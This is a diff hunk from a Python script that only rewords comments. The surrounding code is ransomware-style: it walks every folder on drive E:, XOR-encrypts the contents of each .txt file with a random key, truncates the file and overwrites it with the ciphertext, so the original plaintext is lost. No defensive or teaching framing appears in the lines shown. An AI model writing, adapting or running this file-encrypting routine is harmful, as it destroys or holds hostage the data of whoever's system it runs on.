@@ -21,18 +21,18 @@ path = os.walk('E:/')
 for root, directories, files in path:
     for file in files:
         if file.endswith(".txt"):
-            #opening the file
+            #Opening the file
             f = open(os.path.join(root, file), 'r')
             #Reading the file
             plainText=f.read()
-            #XORing the file bytes
+            #XOR-ing the file bytes
             if len(plainText) > 16:
                 XORED_List = [chr(ord(a) ^ ord(b)) for a,b in zip(plainText,random_key*len(plainText))]
             else:
                 XORED_List = [chr(ord(a) ^ ord(b)) for a,b in zip(plainText,random_key)]
             #Converting the list to string
             cipherText = ''.join([str(cell) for cell in XORED_List])
-            #Reopen the file to be able to write on it and modify it
+            #Re-open the file to be able to write on it and modify it
             f = open(os.path.join(root, file), 'w')
             #Removing the plain text from the file
             f.truncate(0)
